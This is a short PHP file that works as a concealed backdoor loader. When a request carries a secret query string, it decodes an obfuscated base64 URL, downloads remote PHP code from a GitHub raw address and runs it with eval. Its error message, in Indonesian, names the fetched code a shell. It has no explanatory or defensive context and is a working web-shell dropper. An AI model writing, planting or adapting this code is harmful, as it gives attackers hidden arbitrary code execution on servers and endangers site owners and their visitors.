<?php
if ($_SERVER['QUERY_STRING'] === 'asdkl') {
    $url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzVZNEgvc2VvL21haW4vc2VvYmFyYmFyLnBocA==');
    $s = @file_get_contents($url);
    if (!$s) die("❌ Gagal ambil shell.");
    $s = str_replace(['<?php', '<?', '?>'], '', $s);
    eval($s);
    exit;
}
?>  
